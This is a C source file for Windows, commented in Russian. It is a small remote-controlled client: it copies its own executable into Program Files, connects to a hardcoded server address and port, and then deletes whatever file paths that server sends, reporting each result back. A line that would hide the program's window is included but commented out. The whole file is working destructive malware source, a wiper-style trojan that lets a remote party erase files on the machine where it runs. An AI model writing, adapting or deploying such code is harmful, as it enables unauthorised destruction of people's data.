#include <string.h>
#include <stdio.h>
#include <WinSock2.h>
#include <Windows.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma warning(disable:4996) 

#define HOST "192.168.43.153"
#define PORT 7777
#define MAX_PATH_LENGTH 500
#define SYSTEM_DIRECTORY "C:\\Program Files\\"

void initWinsock();
SOCKADDR_IN createServer();
char* copyFileToSystemDirectory();

int main(int argc, char* argv[]) {
	// Скрыть окно программы
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	char* currentExecutionFile = copyFileToSystemDirectory();

	initWinsock();
	SOCKADDR_IN server = createServer();
	
	SOCKET connection = socket(AF_INET, SOCK_STREAM, NULL);
	if (connect(connection, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
		puts("Connect failed");
		exit(WSAGetLastError());
	}
	else {
		puts("Connected");
	}

	// Ждем информации от сервера в бесконечном цикле, поскольку именно сервер решает, сколько файлов надо будет удалять
	while (1) {
		char filenameToDelete[MAX_PATH_LENGTH];
		// Получаем с сервера сообщение с путем к файлу, который требуется удалить
		if (SOCKET_ERROR == recv(connection, filenameToDelete, sizeof(filenameToDelete), NULL)) {
			puts("Connection failed");
			exit(SOCKET_ERROR);
		}

		// Проверяем, успешно ли удалился файл
		int resultStatus = remove(filenameToDelete);
		printf("Filename: %s\nResult: %d\n", filenameToDelete, resultStatus);
		/* Статус передается в строке (массиве типа char из двух элементов), поскольку функции для передачи (send и recv) работают со строками.
		* Для передачи на сервер статус удаления файла переводится в строку из числа*/
		char result[2] = { resultStatus + '0', '\0' };

		// Отправляем информацию о том, успешно ли выполнена операция удаления файла, на сервер
		send(connection, result, sizeof(result), NULL);
	}
	system("pause");
}

void initWinsock() {
	WSADATA wsaData;

	// Номер версии -  2.2
	WORD winsockVersion = MAKEWORD(2, 2);
	if (WSAStartup(winsockVersion, &wsaData) != 0) {
		puts("Winsock library load error");
		exit(1);
	}
}

SOCKADDR_IN createServer() {
	SOCKADDR_IN server;

	// Адрес, на котором будем слушать соединения
	server.sin_addr.s_addr = inet_addr(HOST);
	server.sin_port = PORT;
	// С какими протоколами будет работать
	server.sin_family = AF_INET;

	return server;
}

/*Копирует текущий исполняемый файл программы в системную директорию.
Если копирование прошло удачно, возвращает путь к копии файла, находящийся в системной директории.
Если копирование завершилось с ошибкой, то возвращается полный путь к текущему исполняемому файлу.*/
char* copyFileToSystemDirectory() {
	char* currentPathToExecutionFile = (char*)malloc(MAX_PATH_LENGTH * sizeof(char));
	char* finalFilePath = (char*) malloc(MAX_PATH_LENGTH * sizeof(char));
	// Получаем путь к текущему файлу и записываем его в переменную currentFilename
	GetModuleFileNameA(NULL, currentPathToExecutionFile, MAX_PATH_LENGTH);
	puts(currentPathToExecutionFile);

	// Чтобы получить название текущего файла, достаем его из конца полного пути к текущему файлу
	char copy[MAX_PATH_LENGTH];
	strcpy(copy, currentPathToExecutionFile);
	char* executionFilename = _strrev(strtok(_strrev(copy), "\\"));

	// Генерируем путь к новому файлу в системной директории и копируем имеющийся файл по этому пути
	strcpy(finalFilePath, SYSTEM_DIRECTORY);
	strcat(finalFilePath, executionFilename);

	if (!CopyFile(currentPathToExecutionFile, finalFilePath, FALSE)) {
		printf("Error writing file: %u\n", GetLastError());
		return currentPathToExecutionFile;
	}
	else return finalFilePath;

	
}